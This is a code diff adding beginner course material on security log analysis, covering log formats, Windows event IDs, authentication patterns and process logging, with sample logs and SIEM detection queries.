@@ -8522,6 +8522,2560 @@ Welcome to the blue team. The defenders need you. 🛡️
         "Schedule 30 minutes of daily learning time"
       ]
     }
+  },
+  // ===== LOG ANALYSIS FOR BEGINNERS COURSE =====
+  // Module 1: Introduction to Security Logs
+  {
+    id: "1.1",
+    courseId: "log-analysis",
+    title: "What are Security Logs?",
+    content: `
+# What are Security Logs?
+
+**Security logs** are records of events that occur within your IT environment. They are the digital footprints left by every action, connection, and transaction in your systems.
+
+## Why Logs Matter in Security
+
+Logs are the **foundation of security monitoring and incident response**. Without logs, we're essentially blind to what's happening in our environment.
+
+> "Logs are like the black box recorder of an airplane—they tell us what happened, when, and often why."
+
+### Key Uses of Security Logs
+
+| Use Case | Description |
+|----------|-------------|
+| **Threat Detection** | Identify malicious activity through patterns and anomalies |
+| **Incident Investigation** | Reconstruct what happened during a security incident |
+| **Compliance** | Meet regulatory requirements (PCI-DSS, HIPAA, SOX) |
+| **Forensics** | Provide evidence for legal proceedings |
+| **Troubleshooting** | Debug application and system issues |
+
+## What Gets Logged?
+
+Almost everything in IT can generate logs:
+
+### Endpoint Logs
+- User logins and logoffs
+- Process execution
+- File access and modifications
+- Registry changes (Windows)
+- Privilege escalation
+
+### Network Logs
+- Firewall allow/deny decisions
+- DNS queries
+- HTTP/HTTPS requests
+- VPN connections
+- NetFlow data
+
+### Application Logs
+- Database queries
+- API calls
+- Authentication attempts
+- Error messages
+- Transaction records
+
+### Cloud Logs
+- Resource access
+- Configuration changes
+- IAM activities
+- API calls
+
+## The 5 W's of Log Analysis
+
+Every log entry should help answer:
+
+1. **Who** - Which user or service account?
+2. **What** - What action was performed?
+3. **When** - Timestamp of the event
+4. **Where** - Source and destination (IP, hostname)
+5. **Why** - Context and outcome
+
+## Log Levels / Severity
+
+Most logging systems use severity levels:
+
+\`\`\`
+┌─────────────┬────────────────────────────────────┐
+│ Level       │ Description                        │
+├─────────────┼────────────────────────────────────┤
+│ EMERGENCY   │ System is unusable                 │
+│ ALERT       │ Immediate action required          │
+│ CRITICAL    │ Critical conditions                │
+│ ERROR       │ Error conditions                   │
+│ WARNING     │ Warning conditions                 │
+│ NOTICE      │ Normal but significant             │
+│ INFO        │ Informational messages             │
+│ DEBUG       │ Debug-level messages               │
+└─────────────┴────────────────────────────────────┘
+\`\`\`
+
+## Challenges in Log Analysis
+
+### Volume
+Modern environments generate **millions of events per day**. A single busy server can produce gigabytes of logs daily.
+
+### Variety
+Different systems use different formats, making correlation challenging.
+
+### Velocity
+Real-time threat detection requires processing logs as they're generated.
+
+### Veracity
+Not all logs are equally reliable or complete.
+
+## The Security Analyst's Perspective
+
+As a security analyst, you'll approach logs with specific questions:
+
+- Is this activity expected or suspicious?
+- Does this pattern indicate an attack?
+- What's the timeline of events?
+- Who or what is responsible?
+- What's the impact?
+
+Mastering log analysis is one of the most valuable skills for any security professional!
+    `,
+    keyTakeaways: [
+      "Logs are records of events that provide visibility into IT environments",
+      "Security logs are essential for detection, investigation, and compliance",
+      "The 5 W's (Who, What, When, Where, Why) guide log analysis",
+      "Log severity levels help prioritize events",
+      "Volume, variety, and velocity are key challenges in log analysis"
+    ],
+    additionalResources: [
+      { title: "NIST Guide to Computer Security Log Management", type: "documentation" },
+      { title: "SANS Log Management Best Practices", type: "article" }
+    ]
+  },
+  {
+    id: "1.2",
+    courseId: "log-analysis",
+    title: "Common Log Formats",
+    content: `
+# Common Log Formats
+
+Understanding log formats is essential for parsing and analyzing security events. Different systems and vendors use different formats, but several standards have emerged.
+
+## Syslog Format
+
+**Syslog** is the most widely used logging standard, especially in Unix/Linux environments and network devices.
+
+### Traditional Syslog (RFC 3164)
+
+\`\`\`
+<priority>timestamp hostname process[pid]: message
+\`\`\`
+
+**Example:**
+\`\`\`
+<34>Oct 11 22:14:15 mymachine su: 'su root' failed for lonvick on /dev/pts/8
+\`\`\`
+
+### Modern Syslog (RFC 5424)
+
+\`\`\`
+<priority>version timestamp hostname app-name procid msgid structured-data msg
+\`\`\`
+
+**Example:**
+\`\`\`
+<165>1 2023-10-11T22:14:15.003Z mymachine.example.com evntslog - ID47 [exampleSDID@32473 iut="3"] BOMAn application event log entry...
+\`\`\`
+
+### Priority Calculation
+Priority = (Facility × 8) + Severity
+
+| Facility | Value | Description |
+|----------|-------|-------------|
+| kern | 0 | Kernel messages |
+| user | 1 | User-level messages |
+| auth | 4 | Security/auth messages |
+| authpriv | 10 | Security/auth (private) |
+| local0-7 | 16-23 | Custom use |
+
+## CEF (Common Event Format)
+
+**CEF** is a standardized format developed by ArcSight, widely used in SIEM integrations.
+
+\`\`\`
+CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
+\`\`\`
+
+**Example:**
+\`\`\`
+CEF:0|Security|Firewall|1.0|100|Connection Blocked|7|src=192.168.1.100 dst=10.0.0.1 spt=12345 dpt=443 proto=TCP
+\`\`\`
+
+### CEF Extension Fields
+- **src/dst** - Source/Destination IP
+- **spt/dpt** - Source/Destination Port
+- **act** - Action taken
+- **msg** - Human-readable message
+- **cs1-cs6** - Custom strings
+
+## JSON Format
+
+**JSON** is increasingly popular for logs due to its flexibility and machine readability.
+
+\`\`\`json
+{
+  "timestamp": "2023-10-11T22:14:15.003Z",
+  "level": "warning",
+  "source": "firewall",
+  "action": "blocked",
+  "src_ip": "192.168.1.100",
+  "dst_ip": "10.0.0.1",
+  "dst_port": 443,
+  "protocol": "TCP",
+  "message": "Suspicious outbound connection blocked"
+}
+\`\`\`
+
+### Advantages of JSON
+- Self-describing (field names included)
+- Nested structures supported
+- Easy to parse programmatically
+- Human-readable
+
+## Windows Event Log Format (EVTX)
+
+Windows uses a structured XML-based format internally.
+
+\`\`\`xml
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4624</EventID>
+    <TimeCreated SystemTime="2023-10-11T22:14:15.003Z"/>
+    <Computer>WORKSTATION01</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">john.doe</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.50</Data>
+  </EventData>
+</Event>
+\`\`\`
+
+## Apache/NCSA Combined Log Format
+
+Common for web server access logs:
+
+\`\`\`
+%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
+\`\`\`
+
+**Example:**
+\`\`\`
+192.168.1.100 - john [11/Oct/2023:22:14:15 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+\`\`\`
+
+## LEEF (Log Event Extended Format)
+
+IBM's format similar to CEF:
+
+\`\`\`
+LEEF:Version|Vendor|Product|Version|EventID|
+\`\`\`
+
+## Parsing Tips
+
+1. **Identify the format first** - Look for patterns, delimiters, and structure
+2. **Use the right tools** - Regex, parsers, or SIEM built-in parsing
+3. **Normalize fields** - Map vendor-specific fields to common names
+4. **Handle timestamps** - Convert to UTC, parse correctly
+5. **Extract key fields** - Focus on security-relevant data
+    `,
+    keyTakeaways: [
+      "Syslog is the most common format for Unix/Linux and network devices",
+      "CEF provides a standardized format for SIEM integration",
+      "JSON is increasingly popular for its flexibility and readability",
+      "Windows uses XML-based EVTX format with Event IDs",
+      "Understanding log formats is essential for effective parsing and analysis"
+    ]
+  },
+  {
+    id: "1.3",
+    courseId: "log-analysis",
+    title: "Log Sources Overview",
+    content: `
+# Log Sources Overview
+
+Security analysts work with logs from many different sources. Understanding what each source provides helps you know where to look during investigations.
+
+## Endpoint Log Sources
+
+### Windows Systems
+
+| Log Type | Location | Security Value |
+|----------|----------|----------------|
+| Security | Event Viewer | Authentication, privilege use |
+| System | Event Viewer | Service changes, errors |
+| Application | Event Viewer | App crashes, errors |
+| PowerShell | Event Viewer | Script execution |
+| Sysmon | Event Viewer | Process, network, file events |
+
+### Linux Systems
+
+| Log File | Location | Security Value |
+|----------|----------|----------------|
+| auth.log/secure | /var/log | Authentication events |
+| syslog | /var/log | System messages |
+| kern.log | /var/log | Kernel messages |
+| audit.log | /var/log/audit | SELinux/auditd events |
+| lastlog | /var/log | Last login info |
+
+### macOS Systems
+- Unified Log (Console.app)
+- /var/log/system.log
+- /var/log/install.log
+
+## Network Device Logs
+
+### Firewalls
+- **What they log:** Traffic allow/deny, NAT translations, VPN connections
+- **Key fields:** src_ip, dst_ip, port, action, rule_id
+- **Popular vendors:** Palo Alto, Fortinet, Cisco ASA, Check Point
+
+### Proxies / Web Gateways
+- **What they log:** HTTP requests, URLs, user agents, response codes
+- **Key fields:** url, user, category, action, bytes
+- **Popular vendors:** Zscaler, Bluecoat, Squid
+
+### DNS Servers
+- **What they log:** DNS queries and responses
+- **Key fields:** query_name, query_type, response, client_ip
+- **Use cases:** Detecting C2, DGA, data exfiltration
+
+### IDS/IPS
+- **What they log:** Signature matches, anomaly detections
+- **Key fields:** signature_id, severity, src_ip, dst_ip
+- **Popular vendors:** Snort, Suricata, Cisco Firepower
+
+## Application Logs
+
+### Web Servers
+- Apache access/error logs
+- Nginx access/error logs
+- IIS logs (W3C format)
+
+### Databases
+- Query logs
+- Authentication logs
+- Error logs
+- Audit logs
+
+### Email Systems
+- Message tracking logs
+- Authentication logs
+- Spam/phishing detection logs
+
+## Cloud Service Logs
+
+### AWS
+| Service | Log Type |
+|---------|----------|
+| CloudTrail | API activity |
+| VPC Flow Logs | Network traffic |
+| GuardDuty | Threat detection |
+| S3 Access Logs | Bucket access |
+
+### Azure
+| Service | Log Type |
+|---------|----------|
+| Activity Log | Management operations |
+| Azure AD Sign-ins | Authentication |
+| NSG Flow Logs | Network traffic |
+| Defender for Cloud | Security alerts |
+
+### Google Cloud
+- Cloud Audit Logs
+- VPC Flow Logs
+- Cloud Armor logs
+
+## Identity & Access Logs
+
+### Active Directory
+- Domain Controller Security logs
+- LDAP query logs
+- Group Policy logs
+
+### Identity Providers (IdP)
+- Okta, Azure AD, Ping
+- SSO authentication logs
+- MFA events
+
+## EDR/XDR Telemetry
+
+Modern endpoint detection tools provide rich telemetry:
+- Process creation with command lines
+- Network connections
+- File system activity
+- Registry modifications
+- Memory operations
+
+## Prioritizing Log Sources
+
+For security monitoring, prioritize:
+
+1. **Authentication logs** - Who accessed what
+2. **Firewall/Network logs** - What traffic occurred
+3. **Endpoint detection** - What executed on systems
+4. **DNS logs** - Domain communication
+5. **Email logs** - Phishing detection
+
+\`\`\`
+┌────────────────────────────────────────────────┐
+│              SOC Log Priority                  │
+├────────────────────────────────────────────────┤
+│ 1. Auth (AD, VPN, Cloud)      ████████████ HIGH│
+│ 2. Network (FW, Proxy, DNS)   ██████████ HIGH  │
+│ 3. Endpoint (EDR, Sysmon)     ████████ HIGH    │
+│ 4. Email (O365, Exchange)     ██████ MEDIUM    │
+│ 5. Application (Web, DB)      ████ MEDIUM      │
+│ 6. Cloud (AWS, Azure, GCP)    ██████ MEDIUM    │
+└────────────────────────────────────────────────┘
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Endpoints provide authentication, process, and file activity logs",
+      "Network devices log traffic flows, DNS queries, and security decisions",
+      "Cloud services have their own logging systems (CloudTrail, Azure Activity)",
+      "Authentication logs are the highest priority for security monitoring",
+      "EDR provides rich telemetry beyond traditional OS logs"
+    ]
+  },
+  {
+    id: "1.4",
+    courseId: "log-analysis",
+    title: "Log Collection & Centralization",
+    content: `
+# Log Collection & Centralization
+
+Collecting logs from across your environment and centralizing them is critical for effective security monitoring.
+
+## Why Centralize Logs?
+
+### Without Centralization
+\`\`\`
+[Server 1] ─── Local logs only
+[Server 2] ─── Local logs only
+[Firewall] ─── Local logs only
+[Workstations] ─── Local logs only
+
+❌ Analyst must access each system
+❌ No correlation possible
+❌ Logs may be deleted by attackers
+❌ No long-term retention
+\`\`\`
+
+### With Centralization
+\`\`\`
+[Server 1] ──────┐
+[Server 2] ──────┼──→ [SIEM] ──→ [Analyst]
+[Firewall] ──────┤        │
+[Workstations] ──┘        ↓
+                    [Storage/Archive]
+
+✅ Single pane of glass
+✅ Cross-source correlation
+✅ Protected from tampering
+✅ Long-term retention
+\`\`\`
+
+## Log Collection Methods
+
+### Agent-Based Collection
+
+Agents installed on endpoints forward logs.
+
+**Pros:**
+- Rich data collection
+- Works across networks
+- Can filter at source
+
+**Cons:**
+- Agent deployment needed
+- Resource overhead
+- Agent management
+
+**Common Agents:**
+- Elastic Agent / Beats
+- Splunk Universal Forwarder
+- Microsoft MMA/AMA
+- Sysmon + WEF
+
+### Agentless Collection
+
+Logs pulled from systems or sent via syslog.
+
+**Syslog (UDP/TCP/TLS):**
+\`\`\`
+[Device] ──UDP/514──→ [Syslog Server] ──→ [SIEM]
+\`\`\`
+
+**Windows Event Forwarding (WEF):**
+\`\`\`
+[Windows Clients] ──WinRM──→ [Collector] ──→ [SIEM]
+\`\`\`
+
+**API Polling:**
+\`\`\`
+[Cloud Service] ←──API──→ [SIEM] (pulls logs)
+\`\`\`
+
+### Protocol Comparison
+
+| Method | Reliability | Security | Use Case |
+|--------|-------------|----------|----------|
+| Syslog UDP | Low (no ack) | Low | Legacy devices |
+| Syslog TCP | Medium | Low | Network devices |
+| Syslog TLS | Medium | High | Secure forwarding |
+| HTTPS/API | High | High | Cloud, modern apps |
+| Agent | High | High | Endpoints |
+
+## Log Pipeline Architecture
+
+A typical enterprise log pipeline:
+
+\`\`\`
+┌──────────────┐
+│ Log Sources  │
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│  Collectors  │  (rsyslog, Logstash, Fluentd)
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│   Parsing    │  (Extract fields, normalize)
+│   & Enrich   │
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│    SIEM      │  (Index, correlate, alert)
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│   Storage    │  (Hot/Warm/Cold tiers)
+└──────────────┘
+\`\`\`
+
+## Key Considerations
+
+### Timestamp Handling
+- Ensure all sources use NTP
+- Normalize to UTC
+- Handle timezone conversions
+- Log ingestion time vs event time
+
+### Data Normalization
+Map vendor-specific fields to common schema:
+\`\`\`
+Vendor A: src_addr → Common: source_ip
+Vendor B: srcip → Common: source_ip
+Vendor C: SourceIP → Common: source_ip
+\`\`\`
+
+### Log Retention
+| Log Type | Typical Retention |
+|----------|------------------|
+| Security events | 1-2 years |
+| Network traffic | 90 days - 1 year |
+| Debug/verbose | 7-30 days |
+| Compliance (PCI) | 1 year minimum |
+
+### Volume Planning
+Estimate daily log volume:
+- Windows DC: 500MB - 2GB/day
+- Firewall: 1-10GB/day
+- Web proxy: 2-20GB/day
+- EDR: 1-5GB/endpoint/day
+
+## Common Collection Tools
+
+| Tool | Type | Use Case |
+|------|------|----------|
+| rsyslog | Open source | Linux syslog collection |
+| Logstash | Open source | ETL pipeline |
+| Fluentd | Open source | Lightweight collection |
+| NXLog | Commercial/Free | Cross-platform |
+| Cribl | Commercial | Log routing/reduction |
+    `,
+    keyTakeaways: [
+      "Centralized logging enables correlation and protects logs from tampering",
+      "Agent-based collection provides rich data; agentless is simpler to deploy",
+      "Syslog, WEF, and APIs are common collection methods",
+      "Timestamp normalization and field mapping are critical",
+      "Plan for log volume and retention requirements"
+    ]
+  },
+  // Module 2: Windows Event Logs
+  {
+    id: "2.1",
+    courseId: "log-analysis",
+    title: "Windows Event Log Architecture",
+    content: `
+# Windows Event Log Architecture
+
+Understanding how Windows logging works is essential for security analysis. Windows Event Logs are one of the richest sources of security telemetry.
+
+## Event Log Structure
+
+Windows stores logs in **.evtx** files using an XML-based structure.
+
+### Log Locations
+\`\`\`
+%SystemRoot%\\System32\\winevt\\Logs\\
+├── Security.evtx
+├── System.evtx
+├── Application.evtx
+├── Microsoft-Windows-Sysmon%4Operational.evtx
+├── Microsoft-Windows-PowerShell%4Operational.evtx
+└── ... (hundreds more)
+\`\`\`
+
+## Main Event Log Channels
+
+| Channel | Purpose | Key Events |
+|---------|---------|------------|
+| **Security** | Audit events | Logons, privilege use, object access |
+| **System** | OS events | Service changes, drivers, errors |
+| **Application** | App events | Crashes, app-specific logs |
+| **PowerShell/Operational** | PS activity | Script execution |
+| **Sysmon/Operational** | Sysmon events | Process, network, file |
+
+## Event Log Components
+
+Each event contains:
+
+\`\`\`xml
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4624</EventID>
+    <Version>2</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2023-10-11T22:14:15.003Z"/>
+    <EventRecordID>123456</EventRecordID>
+    <Computer>WORKSTATION01.domain.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">john.doe</Data>
+    <Data Name="LogonType">10</Data>
+    ...
+  </EventData>
+</Event>
+\`\`\`
+
+### Key Fields
+
+| Field | Description |
+|-------|-------------|
+| EventID | Unique event identifier |
+| TimeCreated | When the event occurred |
+| Computer | Hostname where event was logged |
+| Provider | Source of the event |
+| EventData | Event-specific details |
+
+## Event Viewer Tool
+
+The built-in **Event Viewer** (eventvwr.msc) allows you to:
+- Browse and filter logs
+- Create custom views
+- Export logs
+- Clear logs (requires admin)
+
+### Useful Filters
+\`\`\`
+# Filter by Event ID
+Event ID = 4624
+
+# Filter by time
+TimeCreated >= [Date]
+
+# Filter by user (XPath)
+*[EventData[Data[@Name='TargetUserName']='john.doe']]
+\`\`\`
+
+## Audit Policy Configuration
+
+Windows must be configured to generate security events:
+
+\`\`\`
+Local Security Policy → Advanced Audit Policy Configuration:
+
+├── Logon/Logoff
+│   ├── Audit Logon: Success, Failure
+│   └── Audit Logoff: Success
+├── Account Management
+│   └── Audit User Account Management: Success, Failure
+├── Privilege Use
+│   └── Audit Sensitive Privilege Use: Success, Failure
+└── Object Access
+    └── Audit File System: Success, Failure
+\`\`\`
+
+## Windows Event Forwarding (WEF)
+
+Centralize Windows logs without third-party agents:
+
+\`\`\`
+[Workstation 1] ──┐
+[Workstation 2] ──┼──WinRM──→ [Collector Server] ──→ [SIEM]
+[Server 1] ───────┘
+\`\`\`
+
+### WEF Architecture
+1. **Source computers** push events
+2. **Collector** receives and stores
+3. **Subscriptions** define what to collect
+
+## PowerShell Commands for Logs
+
+\`\`\`powershell
+# List all event logs
+Get-WinEvent -ListLog *
+
+# Get recent Security events
+Get-WinEvent -LogName Security -MaxEvents 100
+
+# Filter by Event ID
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}
+
+# Export to CSV
+Get-WinEvent -LogName Security | Export-Csv events.csv
+\`\`\`
+
+## Log Size and Retention
+
+Default maximum log sizes are often too small:
+
+| Log | Default Size | Recommended |
+|-----|--------------|-------------|
+| Security | 20 MB | 1-4 GB |
+| System | 20 MB | 128 MB |
+| Application | 20 MB | 128 MB |
+| PowerShell | 15 MB | 1 GB |
+
+Configure via: **Event Viewer → Log Properties → Maximum log size**
+    `,
+    keyTakeaways: [
+      "Windows logs are stored in .evtx files with XML structure",
+      "Security, System, Application, and PowerShell are key channels",
+      "Audit policies must be configured to generate security events",
+      "Event Viewer and PowerShell are primary tools for log access",
+      "Default log sizes are too small—increase for security monitoring"
+    ]
+  },
+  {
+    id: "2.2",
+    courseId: "log-analysis",
+    title: "Critical Security Event IDs",
+    content: `
+# Critical Security Event IDs
+
+Memorizing key Windows Event IDs is essential for rapid threat detection. These are the events you'll encounter most frequently.
+
+## Authentication Events
+
+### Logon Events
+
+| Event ID | Description | Security Relevance |
+|----------|-------------|-------------------|
+| **4624** | Successful logon | Track who logged in |
+| **4625** | Failed logon | Brute force detection |
+| **4634** | Logoff | Session tracking |
+| **4647** | User-initiated logoff | Normal logout |
+| **4648** | Explicit credential use | RunAs, credential theft |
+| **4672** | Special privileges assigned | Admin activity |
+
+### Logon Types (Event 4624)
+
+| Type | Name | Description |
+|------|------|-------------|
+| 2 | Interactive | Console logon |
+| 3 | Network | SMB, mapped drives |
+| 4 | Batch | Scheduled tasks |
+| 5 | Service | Service startup |
+| 7 | Unlock | Workstation unlock |
+| 8 | NetworkCleartext | IIS basic auth |
+| 9 | NewCredentials | RunAs /netonly |
+| 10 | RemoteInteractive | RDP |
+| 11 | CachedInteractive | Cached credentials |
+
+**High-Risk Logon Types:** 3 (lateral movement), 10 (RDP access)
+
+### Kerberos Events
+
+| Event ID | Description | Detection Use |
+|----------|-------------|---------------|
+| **4768** | TGT requested | Initial authentication |
+| **4769** | Service ticket requested | Service access |
+| **4771** | Kerberos pre-auth failed | Password attacks |
+| **4776** | Credential validation (NTLM) | NTLM usage |
+
+## Account Management
+
+| Event ID | Description | Security Relevance |
+|----------|-------------|-------------------|
+| **4720** | User account created | New account monitoring |
+| **4722** | User account enabled | Account activation |
+| **4723** | Password change attempted | User-initiated |
+| **4724** | Password reset attempted | Admin reset |
+| **4725** | User account disabled | Access removal |
+| **4726** | User account deleted | Account cleanup |
+| **4728** | User added to security group | Privilege escalation |
+| **4732** | User added to local group | Local admin additions |
+| **4756** | User added to universal group | Domain group changes |
+
+## Process & Command Execution
+
+| Event ID | Description | Security Relevance |
+|----------|-------------|-------------------|
+| **4688** | Process created | Command execution |
+| **4689** | Process exited | Process termination |
+| **1** (Sysmon) | Process created | Enhanced process logging |
+| **400/403** (PS) | PowerShell engine start/stop | Script execution |
+| **4104** (PS) | Script block logging | Full script content |
+
+### Event 4688 - Process Creation
+Enable command-line logging via GPO:
+\`\`\`
+Computer Configuration → Administrative Templates → 
+System → Audit Process Creation → 
+Include command line in process creation events = Enabled
+\`\`\`
+
+## Privilege Escalation
+
+| Event ID | Description | Detection Use |
+|----------|-------------|---------------|
+| **4672** | Special privileges assigned | Admin logon detection |
+| **4673** | Privileged service called | Sensitive operations |
+| **4674** | Operation on privileged object | Critical access |
+
+## Object Access
+
+| Event ID | Description | Security Relevance |
+|----------|-------------|-------------------|
+| **4663** | Object access attempted | File/folder access |
+| **4656** | Handle requested | Access attempt |
+| **4660** | Object deleted | Deletion tracking |
+| **5140** | Network share accessed | SMB access |
+| **5145** | Network share object checked | Share enumeration |
+
+## Scheduled Tasks
+
+| Event ID | Description | Detection Use |
+|----------|-------------|---------------|
+| **4698** | Scheduled task created | Persistence detection |
+| **4699** | Scheduled task deleted | Cleanup activity |
+| **4700** | Scheduled task enabled | Task activation |
+| **4702** | Scheduled task updated | Configuration changes |
+
+## Quick Reference Card
+
+\`\`\`
+AUTHENTICATION:
+  4624 → Successful logon
+  4625 → Failed logon
+  4648 → Explicit credentials (RunAs)
+  4672 → Admin/special privileges
+
+ACCOUNT CHANGES:
+  4720 → User created
+  4732 → Added to local group
+  4728 → Added to domain group
+  4724 → Password reset
+
+EXECUTION:
+  4688 → Process created
+  4104 → PowerShell script block
+
+LATERAL MOVEMENT:
+  4624 (Type 3) → Network logon
+  4624 (Type 10) → RDP logon
+  5140 → Share access
+
+PERSISTENCE:
+  4698 → Scheduled task created
+  7045 → Service installed
+\`\`\`
+
+## Investigation Tip
+
+Always correlate events! A single 4624 tells you someone logged in. Combine with:
+- 4688 events → What did they run?
+- 5140 events → What shares did they access?
+- 4648 events → Did they use other credentials?
+    `,
+    keyTakeaways: [
+      "4624/4625 are essential for authentication monitoring",
+      "Logon Type 3 (network) and 10 (RDP) often indicate lateral movement",
+      "4688 with command-line logging reveals process execution",
+      "4720/4732 help detect unauthorized account creation and privilege escalation",
+      "Always correlate multiple event types for complete visibility"
+    ],
+    practicalExercise: {
+      title: "Event ID Flash Cards",
+      description: "Create flash cards to memorize the top 15 critical Event IDs.",
+      steps: [
+        "Write Event ID on one side, description on the other",
+        "Practice identifying events by ID",
+        "Test yourself on logon types",
+        "Quiz a colleague on the events"
+      ]
+    }
+  },
+  {
+    id: "2.3",
+    courseId: "log-analysis",
+    title: "Authentication & Logon Analysis",
+    content: `
+# Authentication & Logon Analysis
+
+Analyzing authentication logs is fundamental to security monitoring. Most attacks involve compromised credentials at some point.
+
+## The Authentication Flow
+
+\`\`\`
+User → Credentials → Authentication Protocol → Success/Failure → Access
+         ↓                    ↓                      ↓
+    Password/Cert     NTLM/Kerberos/LDAP       4624/4625
+\`\`\`
+
+## Analyzing Event 4624 (Successful Logon)
+
+Key fields to examine:
+
+\`\`\`
+Subject:
+  Security ID: SYSTEM
+  Account Name: WORKSTATION01$
+  
+Logon Information:
+  Logon Type: 10          ← How they logged in
+  Logon GUID: {GUID}
+  
+New Logon:
+  Security ID: DOMAIN\\john.doe
+  Account Name: john.doe   ← Who logged in
+  Account Domain: DOMAIN
+  Logon ID: 0x12345       ← Session identifier
+  
+Network Information:
+  Workstation Name: ATTACKER-PC
+  Source Network Address: 192.168.1.100  ← Where from
+  Source Port: 54321
+  
+Logon Process: NtLmSsp    ← Authentication protocol
+Authentication Package: NTLM
+\`\`\`
+
+## Suspicious Logon Patterns
+
+### 1. Failed Logon Storms (Brute Force)
+\`\`\`
+Time           EventID  User       SourceIP
+10:00:01.001   4625     admin      192.168.1.50
+10:00:01.050   4625     admin      192.168.1.50
+10:00:01.102   4625     admin      192.168.1.50
+10:00:01.155   4625     admin      192.168.1.50
+10:00:01.203   4624     admin      192.168.1.50  ← Success!
+\`\`\`
+
+**Detection:** Multiple 4625 events followed by 4624 from same source.
+
+### 2. Password Spraying
+\`\`\`
+Time           EventID  User       SourceIP       Status
+10:00:01       4625     user1      192.168.1.50   Failed
+10:00:02       4625     user2      192.168.1.50   Failed
+10:00:03       4625     user3      192.168.1.50   Failed
+10:00:04       4624     user4      192.168.1.50   Success!
+\`\`\`
+
+**Detection:** Same source, same password attempt against many accounts.
+
+### 3. Lateral Movement
+\`\`\`
+Source: Workstation01 → Target: Server01
+LogonType: 3 (Network)
+Account: Domain Admin
+Process: cmd.exe → psexec.exe
+\`\`\`
+
+**Detection:** Type 3 logons to servers from workstations, especially with admin accounts.
+
+### 4. Impossible Travel
+\`\`\`
+10:00:00  User john.doe logged in from New York (192.168.1.50)
+10:05:00  User john.doe logged in from Singapore (203.0.113.25)
+\`\`\`
+
+**Detection:** Logins from geographically impossible locations within short time.
+
+### 5. Off-Hours Activity
+\`\`\`
+03:00:00 AM  User finance_user logged in (Type 10 - RDP)
+             Normal hours: 8 AM - 6 PM
+\`\`\`
+
+**Detection:** Logons outside normal business hours for the user.
+
+## NTLM vs Kerberos
+
+### NTLM (Legacy)
+- Events: 4776 (credential validation)
+- Risks: Pass-the-Hash, relay attacks
+- Detection: Monitor for unexpected NTLM usage
+
+### Kerberos (Modern)
+- Events: 4768 (TGT), 4769 (Service Ticket)
+- Risks: Pass-the-Ticket, Kerberoasting
+- Detection: Unusual service ticket requests
+
+## Building Detection Queries
+
+### SIEM Query: Brute Force Detection
+\`\`\`sql
+EventID=4625 
+| stats count by TargetUserName, IpAddress, span=5m 
+| where count > 10
+\`\`\`
+
+### SIEM Query: Admin Logon Monitoring
+\`\`\`sql
+EventID=4624 LogonType IN (3,10) 
+| lookup admin_users TargetUserName 
+| where is_admin=true
+\`\`\`
+
+### SIEM Query: RDP Brute Force
+\`\`\`sql
+EventID=4625 LogonType=10 
+| stats count by IpAddress span=1h 
+| where count > 50
+\`\`\`
+
+## Analysis Checklist
+
+When investigating authentication events:
+
+- [ ] Is this user/account expected to log in here?
+- [ ] Is this logon type normal for this user?
+- [ ] Is the source IP expected?
+- [ ] Is the time of day normal?
+- [ ] Are there preceding failed attempts?
+- [ ] What happened after the logon? (4688 events)
+- [ ] Is the authentication protocol appropriate? (NTLM vs Kerberos)
+    `,
+    keyTakeaways: [
+      "4624 contains critical fields: LogonType, User, SourceIP, and Process",
+      "Brute force shows as multiple 4625 followed by 4624",
+      "Lateral movement typically uses Type 3 (network) logons",
+      "Monitor for NTLM usage as it's more vulnerable than Kerberos",
+      "Correlate authentication events with subsequent activity (4688)"
+    ]
+  },
+  {
+    id: "2.4",
+    courseId: "log-analysis",
+    title: "Process & Command Line Logging",
+    content: `
+# Process & Command Line Logging
+
+Process execution logging is critical for detecting malicious activity. Attackers must run commands, and those commands leave traces.
+
+## Event ID 4688: Process Creation
+
+This is Windows' native process creation logging.
+
+### Key Fields
+
+\`\`\`
+Subject:
+  Account Name: john.doe      ← Who ran it
+  
+Process Information:
+  New Process ID: 0x1234
+  New Process Name: C:\\Windows\\System32\\cmd.exe  ← What ran
+  Creator Process ID: 0x5678
+  Creator Process Name: C:\\Windows\\explorer.exe   ← Parent process
+  
+Command Line: cmd.exe /c whoami  ← Full command (if enabled)
+\`\`\`
+
+### Enabling Command Line Logging
+
+**Via Group Policy:**
+\`\`\`
+Computer Configuration → 
+Administrative Templates → 
+System → Audit Process Creation → 
+Include command line in process creation events = Enabled
+\`\`\`
+
+**Via Registry:**
+\`\`\`
+HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit
+ProcessCreationIncludeCmdLine_Enabled = 1
+\`\`\`
+
+## Sysmon: Enhanced Process Logging
+
+Sysmon provides richer process data than native logging.
+
+### Sysmon Event ID 1: Process Create
+
+\`\`\`xml
+<Event>
+  <EventData>
+    <Data Name="UtcTime">2023-10-11 22:14:15.003</Data>
+    <Data Name="ProcessGuid">{guid}</Data>
+    <Data Name="ProcessId">1234</Data>
+    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
+    <Data Name="CommandLine">cmd.exe /c whoami</Data>
+    <Data Name="User">DOMAIN\\john.doe</Data>
+    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
+    <Data Name="ParentCommandLine">explorer.exe</Data>
+    <Data Name="Hashes">SHA256=abc123...</Data>
+  </EventData>
+</Event>
+\`\`\`
+
+### Sysmon Advantages
+- File hashes (MD5, SHA1, SHA256)
+- Parent command line
+- Process GUID for tracking
